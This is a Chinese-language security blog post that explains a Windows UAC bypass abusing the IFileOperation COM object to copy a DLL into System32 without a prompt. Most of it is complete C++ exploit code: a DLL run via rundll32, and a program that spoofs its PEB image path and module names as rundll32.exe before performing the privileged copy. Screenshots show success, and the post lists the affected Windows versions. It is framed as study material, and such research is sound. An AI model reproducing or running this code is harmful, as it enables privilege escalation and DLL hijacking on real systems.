---
layout:       post
title:        "BypassUAC_IFileOperation越权写文件"
subtitle:     "BypassUAC借助com接口对可信程序的校验漏洞调用com接口越权写文件"
author:      "Ga0weI"
header-style: text
catalog:      true
tags:
    - BypassUAC
    - 代码
    - 进程属性伪造
---



# 0x01 背景

最近在研究分析uac流程，学习uacbypass的一些手法手段；uac流程逆向分析差不多了，文章准备先发到攻防实战社区，后续再更新blog这边；

然后是借助ucame项目学习绕过uac的一些技术手段原理，所以准备开一个系列文章，对一些技术的学习分享到blog上面；



## 正题

基于uacme项目，其实我们可以看到有一大部分的bypassuac的方式原理是：

**利用IFileOperation往高权限目录（system32\syswow）写dll文件，劫持windows内置的能够不弹窗自提权的exe，从而实现提权；**



这里学习下如何使用IFileOperation越权写的漏洞；



# 0x02 原理

IFileOperation本身是一个特殊的com组件，这个com组件主要就是提供用于复制、移动、重命名、创建和删除 Shell 项的方法（Shell 项可以是 命名空间中的任何对象，包括文件系统对象（如文件和文件夹），也可以是虚拟对象。）



所以这个技术其实就是借助com组件的高权限实现，高权限的文件写入操作；但是windows也不傻，他对高权限的com调用是做了限制的，要是可信程序调用才行，比如（explorer.exe、rundll32.exe等微软自己的信任程序）



## 利用方式一

这个信任程序里面有rundll32.exe，那么第一种利用方式就来了，我们只需要编写一个dll，然后将调用IFileOperation com组件的逻辑写到dll里面，然后通过rundll32.exe 调用对应的dll；此时我们就实现对微软规定的 **com组件的调用要求**进行绕过了，导致绕过的原因是rundll32.exe这个可信名单本身可以用来运行任意dll，dll可以被随意构造；



## 利用方式二

可以看到这个可信程序里面有explorer.exe，exploerer.exe的话，我们可以直接通过普通用户的权限对其进行进程注入，比如远程dll注入，然后dll里面调用的IFileIOperation com组件去越权写文件；









当一个com组件调用发生的时候，微软是如何辨认对应的调用者是否是其受信的调用者的呢，有人分析发现，这个对调用进程判断的逻辑存在几个点：

- PEB下面的_RTL_USER_PROCESS_PARAMETERS 里面的ImagePathName; 
- PEB下面的_LDR_DATA_TABLE_ENTRY里面的FullDllName 和 BaseDllName；

![image-20240717190644870](/img/BypassUAC_IFileOperation越权写文件/image-20240717190644870.png)



![image-20240717190832855](/img/BypassUAC_IFileOperation越权写文件/image-20240717190832855.png)



## 利用方式三

在知道windows是如何校验调用程序的具体条件之后，发现相关判断其实都是在peb里面，都可以伪造，那么我们直接开发exe，在调用IFileOperation相关文件操作之前修改进程自己本地的peb相关字段信息为可信程序的信息即可；



# 0x03  实现



## 利用一：

dllmain.cpp

```c++
#include "pch.h"


VOID my_movefile() {
    HMODULE hModule = NULL;
    IFileOperation* fileOperation = NULL;
    LPCWSTR dllName = L"test.dll";
    LPCWSTR SourceFullPath = L"C:\\ProgramData\\test.dll";
    LPCWSTR DestPath = L"C:\\windows\\System32";
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (SUCCEEDED(hr)) {

        hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&fileOperation));
        if (SUCCEEDED(hr)) {
            hr = fileOperation->SetOperationFlags(
                0x0010 |
                0x0004 |
                FOFX_SHOWELEVATIONPROMPT |
                FOFX_NOCOPYHOOKS |
                FOFX_REQUIREELEVATION |
                0x0400);
            if (SUCCEEDED(hr)) {
                IShellItem* from = NULL, * to = NULL;
                hr = SHCreateItemFromParsingName(SourceFullPath, NULL, IID_PPV_ARGS(&from));
                if (SUCCEEDED(hr)) {
                    if (DestPath)
                        hr = SHCreateItemFromParsingName(DestPath, NULL, IID_PPV_ARGS(&to));
                    if (SUCCEEDED(hr)) {
                        hr = fileOperation->CopyItem(from, to, dllName, NULL);
                        if (NULL != to)
                            to->Release();
                    }
                    from->Release();
                }
                if (SUCCEEDED(hr)) {
                    hr = fileOperation->PerformOperations();
                }
            }
            fileOperation->Release();
        }
        CoUninitialize();
    }
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```



pch.h

```c++
#ifndef PCH_H
#define PCH_H

// 添加要在此处预编译的标头
#include "framework.h"
#include <windows.h>
#include <shobjidl.h>
#include <atlbase.h>

#endif //PCH_H
#define DLLAPI   extern "C" __declspec(dllexport)
DLLAPI void my_movefile();



```

### 效果

测试环境：

```
OS 名称:          Microsoft Windows 10 专业版
OS 版本:          10.0.18363 暂缺 Build 18363
```

运行前

![image-20240717201550512](/img/BypassUAC_IFileOperation越权写文件/image-20240717201550512.png)

运行后，无弹窗文件直接越权写入``c:\windows\system32``

![image-20240717201614033](/img/BypassUAC_IFileOperation越权写文件/image-20240717201614033.png)

## 利用二（待补充）

远程进程注入即可



## 利用三：

main.cpp

```c++
#include <windows.h>
#include <shobjidl.h>
#include <atlbase.h>

#define RTL_MAX_DRIVE_LETTERS 32
#define GDI_HANDLE_BUFFER_SIZE32  34
#define GDI_HANDLE_BUFFER_SIZE64  60
#define GDI_BATCH_BUFFER_SIZE 310

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#if !defined(_M_X64)
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32
#else
#define GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64
#endif

typedef ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];
typedef ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];
typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;


typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} STRING;
typedef STRING* PSTRING;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _CLIENT_ID64 {
    ULONG64 UniqueProcess;
    ULONG64 UniqueThread;
} CLIENT_ID64, * PCLIENT_ID64;

typedef struct _LDR_DATA_TABLE_ENTRY_COMPATIBLE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    } DUMMYUNION0;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1; // Size=4 Offset=104 BitOffset=0 BitCount=1
            ULONG MarkedForRemoval : 1; // Size=4 Offset=104 BitOffset=1 BitCount=1
            ULONG ImageDll : 1; // Size=4 Offset=104 BitOffset=2 BitCount=1
            ULONG LoadNotificationsSent : 1; // Size=4 Offset=104 BitOffset=3 BitCount=1
            ULONG TelemetryEntryProcessed : 1; // Size=4 Offset=104 BitOffset=4 BitCount=1
            ULONG ProcessStaticImport : 1; // Size=4 Offset=104 BitOffset=5 BitCount=1
            ULONG InLegacyLists : 1; // Size=4 Offset=104 BitOffset=6 BitCount=1
            ULONG InIndexes : 1; // Size=4 Offset=104 BitOffset=7 BitCount=1
            ULONG ShimDll : 1; // Size=4 Offset=104 BitOffset=8 BitCount=1
            ULONG InExceptionTable : 1; // Size=4 Offset=104 BitOffset=9 BitCount=1
            ULONG ReservedFlags1 : 2; // Size=4 Offset=104 BitOffset=10 BitCount=2
            ULONG LoadInProgress : 1; // Size=4 Offset=104 BitOffset=12 BitCount=1
            ULONG LoadConfigProcessed : 1; // Size=4 Offset=104 BitOffset=13 BitCount=1
            ULONG EntryProcessed : 1; // Size=4 Offset=104 BitOffset=14 BitCount=1
            ULONG ProtectDelayLoad : 1; // Size=4 Offset=104 BitOffset=15 BitCount=1
            ULONG ReservedFlags3 : 2; // Size=4 Offset=104 BitOffset=16 BitCount=2
            ULONG DontCallForThreads : 1; // Size=4 Offset=104 BitOffset=18 BitCount=1
            ULONG ProcessAttachCalled : 1; // Size=4 Offset=104 BitOffset=19 BitCount=1
            ULONG ProcessAttachFailed : 1; // Size=4 Offset=104 BitOffset=20 BitCount=1
            ULONG CorDeferredValidate : 1; // Size=4 Offset=104 BitOffset=21 BitCount=1
            ULONG CorImage : 1; // Size=4 Offset=104 BitOffset=22 BitCount=1
            ULONG DontRelocate : 1; // Size=4 Offset=104 BitOffset=23 BitCount=1
            ULONG CorILOnly : 1; // Size=4 Offset=104 BitOffset=24 BitCount=1
            ULONG ChpeImage : 1; // Size=4 Offset=104 BitOffset=25 BitCount=1
            ULONG ReservedFlags5 : 2; // Size=4 Offset=104 BitOffset=26 BitCount=2
            ULONG Redirected : 1; // Size=4 Offset=104 BitOffset=28 BitCount=1
            ULONG ReservedFlags6 : 2; // Size=4 Offset=104 BitOffset=29 BitCount=2
            ULONG CompatDatabaseProcessed : 1; // Size=4 Offset=104 BitOffset=31 BitCount=1
        };
    } ENTRYFLAGSUNION;
    WORD ObsoleteLoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    } DUMMYUNION1;
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    } DUMMYUNION2;
    //fields below removed for compatibility
} LDR_DATA_TABLE_ENTRY_COMPATIBLE, * PLDR_DATA_TABLE_ENTRY_COMPATIBLE;
typedef LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;

typedef LDR_DATA_TABLE_ENTRY* PCLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;


typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, * PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;


typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
    PVOID PackageDependencyData; //8+
    ULONG ProcessGroupId;
    // ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ReservedBits0 : 25;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER GdiHandleBuffer;
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDefaultActivationContextData;
    PVOID SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PVOID* FlsCallback;
    LIST_ENTRY FlsListHead;
    PVOID FlsBitmap;
    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pContextData;
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG LibLoaderTracingEnabled : 1;
            ULONG SpareTracingBits : 29;
        };
    };
    ULONGLONG CsrServerReadOnlySharedMemoryBase;
} PEB, * PPEB;

typedef struct _GDI_TEB_BATCH {
    ULONG	Offset;
    UCHAR	Alignment[4];
    ULONG_PTR HDC;
    ULONG	Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME* Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;

typedef struct _TEB {
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID SystemReserved1[54];
    NTSTATUS ExceptionCode;
    PVOID ActivationContextStackPointer;
#if defined(_M_X64)
    UCHAR SpareBytes[24];
#else
    UCHAR SpareBytes[36];
#endif
    ULONG TxFsContext;

    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#if defined(_M_X64)
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID EtwLocalData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR SoftPatchPtr1;
    PVOID ThreadPoolData;
    PVOID* TlsExpansionSlots;
#if defined(_M_X64)
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapVirtualAffinity;
    HANDLE CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SpareSameTebBits : 1;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG SpareUlong0;
    PVOID ResourceRetValue;
} TEB, * PTEB;

typedef VOID(NTAPI* PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)(
    _In_    PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_    PVOID Context,
    _Inout_ BOOLEAN* StopEnumeration
    );

typedef PVOID NTAPI RTLINITUNICODESTRING(
    _Inout_	PUNICODE_STRING DestinationString,
    _In_opt_ PCWSTR SourceString
);
typedef RTLINITUNICODESTRING FAR* LPRTLINITUNICODESTRING;
LPRTLINITUNICODESTRING			RtlInitUnicodeString;

typedef NTSTATUS NTAPI RTLENTERCRITICALSECTION(
    _In_ PRTL_CRITICAL_SECTION CriticalSection
);
typedef RTLENTERCRITICALSECTION FAR* LPRTLENTERCRITICALSECTION;
LPRTLENTERCRITICALSECTION			RtlEnterCriticalSection;

typedef NTSTATUS NTAPI RTLLEAVECRITICALSECTION(
    _In_ PRTL_CRITICAL_SECTION CriticalSection
);
typedef RTLLEAVECRITICALSECTION FAR* LPRTLLEAVECRITICALSECTION;
LPRTLLEAVECRITICALSECTION			RtlLeaveCriticalSection;

typedef NTSTATUS NTAPI LDRENUMERATELOADEDMODULES(
    _In_opt_ ULONG Flags,
    _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction,
    _In_opt_ PVOID Context);
typedef LDRENUMERATELOADEDMODULES FAR* LPLDRENUMERATELOADEDMODULES;
LPLDRENUMERATELOADEDMODULES			LdrEnumerateLoadedModules;

typedef NTSTATUS NTAPI NTALLOCATEVIRTUALMEMORY(
    _In_        HANDLE ProcessHandle,
    _Inout_     PVOID* BaseAddress,
    _In_        ULONG_PTR ZeroBits,
    _Inout_     PSIZE_T RegionSize,
    _In_        ULONG AllocationType,
    _In_        ULONG Protect
);
typedef NTALLOCATEVIRTUALMEMORY FAR* LPNTALLOCATEVIRTUALMEMORY;
LPNTALLOCATEVIRTUALMEMORY	NtAllocateVirtualMemory;

LPWSTR g_lpszRundll = TEXT("C:\\windows\\rundll32.exe");

VOID NTAPI supxLdrEnumModulesCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _Inout_ BOOLEAN* StopEnumeration
)
{
    PPEB Peb = (PPEB)Context;

    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        RtlInitUnicodeString(&DataTableEntry->FullDllName, g_lpszRundll);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, L"rundll32.exe");
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

__inline struct _PEB* NtCurrentPeb() { return NtCurrentTeb()->ProcessEnvironmentBlock; }

VOID supMasqueradeProcess(
    VOID
)
{
    NTSTATUS Status;
    PPEB    Peb = NtCurrentPeb();
    SIZE_T  RegionSize;

    PVOID g_lpszExplorer = NULL;
    RegionSize = 0x1000;

    Status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &g_lpszExplorer,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (NT_SUCCESS(Status)) {
        RtlEnterCriticalSection(Peb->FastPebLock);

        RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, g_lpszRundll);
        RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, g_lpszRundll);

        RtlLeaveCriticalSection(Peb->FastPebLock);

        LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
    }
}

int main(int argc, CHAR* argv[])
{
    HINSTANCE hinstStub = GetModuleHandleA("ntdll.dll");
    if (hinstStub)
    {
        RtlInitUnicodeString = (LPRTLINITUNICODESTRING)GetProcAddress(hinstStub, "RtlInitUnicodeString");
        if (!RtlInitUnicodeString)
        {
            printf("Could not find RtlInitUnicodeString entry point in NTDLL.DLL");
            exit(0);
        }

        RtlEnterCriticalSection = (LPRTLENTERCRITICALSECTION)GetProcAddress(hinstStub, "RtlEnterCriticalSection");
        if (!RtlEnterCriticalSection)
        {
            printf("Could not find RtlEnterCriticalSection entry point in NTDLL.DLL");
            exit(0);
        }

        RtlLeaveCriticalSection = (LPRTLLEAVECRITICALSECTION)GetProcAddress(hinstStub, "RtlLeaveCriticalSection");
        if (!RtlLeaveCriticalSection)
        {
            printf("Could not find RtlLeaveCriticalSection entry point in NTDLL.DLL");
            exit(0);
        }

        LdrEnumerateLoadedModules = (LPLDRENUMERATELOADEDMODULES)GetProcAddress(hinstStub, "LdrEnumerateLoadedModules");
        if (!LdrEnumerateLoadedModules)
        {
            printf("Could not find LdrEnumerateLoadedModules entry point in NTDLL.DLL");
            exit(0);
        }

        NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtAllocateVirtualMemory");
        if (!NtAllocateVirtualMemory)
        {
            printf("Could not find NtAllocateVirtualMemory entry point in NTDLL.DLL");
            exit(0);
        }
    }
    else
    {
        printf("Could not GetModuleHandle of NTDLL.DLL");
        exit(0);
    }

    supMasqueradeProcess();

    getchar();
    HMODULE hModule = NULL;
    IFileOperation* fileOperation = NULL;
    LPCWSTR DFileName = L"test.dll";
    LPCWSTR SourceFullPath = L"C:\\ProgramData\\test.dll";
    LPCWSTR DestPath = L"C:\\windows\\System32";
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (SUCCEEDED(hr)) {

        hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&fileOperation));
        if (SUCCEEDED(hr)) {
            hr = fileOperation->SetOperationFlags(
                FOF_NOCONFIRMATION |
                FOF_SILENT |
                FOFX_SHOWELEVATIONPROMPT |
                FOFX_NOCOPYHOOKS |
                FOFX_REQUIREELEVATION |
                FOF_NOERRORUI);
            if (SUCCEEDED(hr)) {
                IShellItem* from = NULL, * to = NULL;
                hr = SHCreateItemFromParsingName(SourceFullPath, NULL, IID_PPV_ARGS(&from));
                if (SUCCEEDED(hr)) {
                    if (DestPath)
                        hr = SHCreateItemFromParsingName(DestPath, NULL, IID_PPV_ARGS(&to));
                    if (SUCCEEDED(hr)) {
                        hr = fileOperation->CopyItem(from, to, DFileName, NULL);
                        if (NULL != to)
                            to->Release();
                    }
                    from->Release();
                }
                if (SUCCEEDED(hr)) {
                    hr = fileOperation->PerformOperations();
                }
            }
            fileOperation->Release();
        }
        CoUninitialize();
    }
    return 0;
}
```



### 效果

测试环境：

```
OS 名称:          Microsoft Windows 10 专业版
OS 版本:          10.0.18363 暂缺 Build 18363
```



运行前：

![image-20240717201723989](/img/BypassUAC_IFileOperation越权写文件/image-20240717201723989.png)

运行后，无弹窗越权写入：

![image-20240717201753736](/img/BypassUAC_IFileOperation越权写文件/image-20240717201753736.png)





# 0x04 总结

三种绕过方式实现低权限调用IFileOperation com 越权提权；其中最简单好用的还是rundll32.exe 直接运行dll；但是这种也是最好检测的；有利也有弊吧；

然后就是这个IFileOperation com 越权的洞利用环境要求：

目前笔者测试加上网上资料，至少是涵盖: 

```
win7全版本
win10 1836之前的所有
```



参考：

https://3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6IFileOperation%E8%B6%8A%E6%9D%83%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6
